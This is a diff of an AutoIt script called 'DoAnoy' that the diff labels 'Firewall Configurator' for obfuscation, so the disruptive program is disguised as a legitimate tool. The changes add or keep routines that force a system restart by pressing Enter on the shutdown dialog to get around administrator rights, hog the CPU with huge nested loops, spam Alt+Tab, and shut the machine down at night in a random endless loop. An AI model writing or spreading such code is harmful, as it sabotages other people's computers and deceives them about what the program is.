@@ -9,7 +9,7 @@
  Script Function:
 	Template AutoIt script.
 
- ;DoAnoy
+ ;DoAnoy. Selected "Firewall Configurator" for Obfuscationpurposes
 
 #ce ----------------------------------------------------------------------------
 
@@ -39,6 +39,7 @@ Func _Restart(); func 1
    WinClose("[CLASS:Progman]");
    WinWaitActive("[CLASS:#32770]");
    WinActivate("[CLASS:#32770]")
+   ;hitting enter instead of shutdown command, do avoid need of administrator rights.
 	 Sleep(100);
 	  Send("{ENTER}");
 	   Sleep(100);
@@ -65,8 +66,10 @@ EndFunc
 
 Func _SuccFPS(); func 2
    $rdm = "NEW STRING OF PURE NOTHING SENSENESS BRO! 34tgrg3 fggt"
-   For $a = 1 To 90000000
-	  $rdm = $rdm & $rdm & $rdm & $rdm & $rdm & $rdm;
+   For $a = 1 To 9000000
+	  For $b = 1 To 9000000
+		 ConsoleWrite($rdm & $rdm & $rdm & $rdm & $rdm & $rdm);
+	  Next
    Next
 EndFunc
 
@@ -83,6 +86,7 @@ EndFunc
 
 Func _jumpBtwTabs() ; func 4
   For $a = 1 To Round(Random(4 , 12))
+   ;Spaming "ALT + TABULATOR"
    Send("{ALT down}")
    sleep(50)
    Send("{TAB down}")
@@ -98,7 +102,7 @@ Func _jumpBtwTabs() ; func 4
 EndFunc
 
 #cs
-Func _rotateScreen(); NOTE: DOES NOT WORK ON EVRY SYSTEM Func 5
+Func _rotateScreen(); NOTE: DOES NOT WORK ON EVERY SYSTEM Func 5
    Send("{LCTRL down}")
       sleep(50)
    Send("{ALT down}")
@@ -120,7 +124,7 @@ Func _rotateScreen(); NOTE: DOES NOT WORK ON EVRY SYSTEM Func 5
 EndFunc
 #ce
 
-Func _closeAtTime() ;func 6 fährt rechner runter wenn es zwischen 21:00 und 9:00 uhr ist
+Func _closeAtTime() ;func shutdown the computer, if current time is later or equal 21:00  or earlier then 9:00
 
    $lastTime = "21:00"
    $firstTime = "09:00"
@@ -170,8 +174,8 @@ EndFunc
 
 Func _main();
    While True
-	  _closeAtTime(); checks if its earlier then 9 am or later than 9pm. if so, system will Shutdown.
-	  sleep(Round(Random(1000*30, 1000*60*10 ))) ; randome zeit von 30 sek bis 10 min zu test zwecken erstmal alle 10 sek
+	  _closeAtTime()
+	  sleep(Round(Random(1000*30, 1000*60*10 )))
 	 $rdm = Round(Random(1 , $MAX_RANDOM_ZAHL))
 	 ; $rdm = 1; debugg purpose / test purpose
 	  Switch $rdm
